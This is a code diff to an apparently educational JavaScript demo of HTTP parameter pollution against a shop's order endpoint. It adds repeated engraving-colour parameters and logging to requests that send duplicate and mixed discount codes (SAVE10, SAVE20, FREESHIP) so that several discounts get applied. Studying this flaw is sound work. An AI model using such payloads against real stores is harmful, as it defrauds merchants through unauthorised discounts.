@@ -15,7 +15,9 @@ function normalRequest() {
     console.log('\nNormal Request (Single Discount)');
     
     const laptop = products.find(p => p.name === 'Laptop');
-    const postData = `product_id=${laptop.id}&quantity=1&discount_code=SAVE10&shipping_method=standard`;
+    const postData = `product_id=${laptop.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&shipping_method=standard`;
+
+    
 
     sendRequest(postData, 'normal');
 }
@@ -25,7 +27,7 @@ function duplicateDiscounts() {
     
     const smartphone = products.find(p => p.name === 'Smartphone');
     // multiple discount_code parameters
-    const postData = `product_id=${smartphone.id}&quantity=1&discount_code=SAVE10&discount_code=SAVE10&discount_code=SAVE10&shipping_method=standard`;
+    const postData = `product_id=${smartphone.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&discount_code=SAVE10&discount_code=SAVE10&shipping_method=standard`;
 
     sendRequest(postData, 'hpp-simple');
 }
@@ -35,7 +37,7 @@ function multipleDuplicate() {
     console.log('\nDEMO 3: Advanced HPP Attack - Array Parameters');
     
     const headphones = products.find(p => p.name === 'Headphones');
-    const postData = `product_id=${headphones.id}&quantity=1&discount_code=SAVE10&discount_code=SAVE20&discount_code=FREESHIP&shipping_method=overnight`;
+    const postData = `product_id=${headphones.id}&engraving_colors=gold&engraving_colors=silver&engraving_colors=black&quantity=1&discount_code=SAVE10&discount_code=SAVE20&discount_code=FREESHIP&shipping_method=overnight`;
 
     sendRequest(postData, 'hpp-advanced');
 }
@@ -76,6 +78,7 @@ function sendRequest(postData, demoType) {
                     const od = response.order_details;
                     console.log('\nOrder Details:');
                     console.log(`   Product: ${od.product_name}`);
+                    console.log(`   Engraving Colors: ${od.engraving_colors}`);
                     console.log(`   Base Price: $${od.base_price}`);
                     console.log(`   Quantity: ${od.quantity}`);
                     console.log(`   Discounts Applied: ${od.discount_codes.join(', ') || 'None'}`);
@@ -94,6 +97,7 @@ function sendRequest(postData, demoType) {
                     const di = response.debug_info;
                     console.log('\nDebug Info (What Server Actually Received):');
                     console.log(`   Product IDs: ${JSON.stringify(di.all_product_ids)}`);
+                    console.log(`   Engraving Colors: ${JSON.stringify(di.all_engraving_colors)}`);
                     console.log(`   Quantities: ${JSON.stringify(di.all_quantities)}`);
                     console.log(`   Discounts: ${JSON.stringify(di.all_discounts)}`);
                     console.log(`   Shipping Methods: ${JSON.stringify(di.all_shipping_methods)}`);
